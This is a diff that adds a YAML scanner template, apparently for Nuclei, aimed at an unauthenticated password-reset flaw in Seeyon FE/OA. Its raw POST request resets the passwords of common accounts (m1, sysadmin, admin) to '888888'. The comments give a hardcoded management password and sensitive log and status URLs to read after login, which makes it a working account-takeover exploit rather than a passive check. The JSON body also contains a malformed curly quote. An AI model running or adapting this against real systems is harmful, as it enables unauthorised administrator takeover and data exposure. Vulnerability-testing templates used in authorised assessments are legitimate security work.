@@ -1,0 +1,53 @@
+id: seeyon-fe-phoneLogin-restpass-unauth
+info:
+  name: 致远互联 FE 协作办公平台 FE resetPassword - unauth resetpass
+  author: leadlife
+  severity: high
+  description: 致远 OA 未授权短信验证码绕过重置密码漏洞
+  reference: 
+    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C%20OA%20%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E.md
+    - https://www.secrss.com/articles/58664
+  metadata:
+    verified: false
+    fofa-query: title="FE协作办公平台" || body="li_plugins_download"
+  tags: seeyon,oa,resetpass
+
+http:
+  - raw:
+      - |+
+        POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 45
+
+        {"loginName":"{{username}},”password":"888888"}
+
+    payloads:
+      username: 
+        - 'm1'
+        - 'sysadmin'
+        - 'admin'
+        
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "code"
+          - "data"
+          - "message"
+          - "success"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# 扫描到后，必须知道用户名，才可进行后续利用
+# 常见为：m1，sysadmin，admin
+# poc 如果扫描成功，参考 ref 操作上面代码，后台密码为 WLCCYBD@SEEYON 登录后通过如下url获得一些敏感信息   
+# 登录后通过如下url获得一些敏感信息
+# /seeyon/management/status.jsp
+# /seeyon/logs/login.log
+# /seeyon/logs/v3x.log
